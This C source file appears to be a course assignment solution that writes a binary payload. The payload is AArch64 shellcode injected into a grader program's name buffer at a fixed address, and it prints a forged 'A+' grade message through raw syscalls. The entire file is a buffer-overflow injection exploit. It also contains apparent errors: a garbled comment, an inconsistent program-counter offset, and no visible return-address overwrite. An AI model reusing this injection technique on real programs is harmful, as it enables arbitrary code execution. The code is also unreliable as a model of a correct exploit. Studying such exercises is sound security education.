/* createdataAplus.c
 *
 * Generates the “dataAplus” payload for the grader.  
 * BüFSIZE=48 bytes for the injected stub in name[], followed by your message.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "miniassembler.h"

enum { BUFSIZE = 48 };

int main(void) {
    /* all declarations first (ISO C90) */
    FILE              *f;
    unsigned long      pc;
    unsigned int       instr;
    const unsigned long NAME_ADDR = 0x420058UL;      /* start of name[] */
    const unsigned int  SVC_INST  = 0xd4000001;      /* encoding for `svc #0` */
    const char         *msg       = "A+ is your grade\nThank you, BZOC\n";
    unsigned            msglen    = (unsigned)strlen(msg);
    int                 pad, i;

    /* open the payload file */
    f = fopen("dataAplus", "w");
    if (!f) {
        perror("fopen dataAplus");
        return 1;
    }

    /* 1) build the 48-byte stub at name[] (it will live at NAME_ADDR at runtime) */
    pc = NAME_ADDR + 28;

    /* --- write(1, msg, msglen) syscall --- */
    instr = MiniAssembler_mov(8,  64);                   /* w8 = 64 (sys_write) */
    fwrite(&instr, 4, 1, f);  pc += 4;
    instr = MiniAssembler_mov(0,   1);                   /* w0 = 1  (stdout)   */
    fwrite(&instr, 4, 1, f);  pc += 4;
    instr = MiniAssembler_adr(1, NAME_ADDR + BUFSIZE, pc); /* x1 = &msg        */
    fwrite(&instr, 4, 1, f);  pc += 4;
    instr = MiniAssembler_mov(2, msglen);                /* w2 = msglen      */
    fwrite(&instr, 4, 1, f);  pc += 4;
    fwrite(&SVC_INST,     4, 1, f);  pc += 4;            /* svc #0           */

    /* --- exit(0) syscall --- */
    instr = MiniAssembler_mov(8,  93);                   /* w8 = 93 (sys_exit) */
    fwrite(&instr, 4, 1, f);  pc += 4;
    instr = MiniAssembler_mov(0,   0);                   /* w0 = 0 (status)  */
    fwrite(&instr, 4, 1, f);  pc += 4;
    fwrite(&SVC_INST,     4, 1, f);  pc += 4;            /* svc #0           */

    /* 2) pad stub out to exactly BUFSIZE bytes */
    pad = BUFSIZE - (int)(pc - (NAME_ADDR + 28));
    for (i = 0; i < pad; i++) {
        fputc('\0', f);
    }

    /* 3) append the literal message bytes immediately after the 48-byte stub */
    fwrite(msg, 1, msglen, f);

    fclose(f);
    return 0;
}

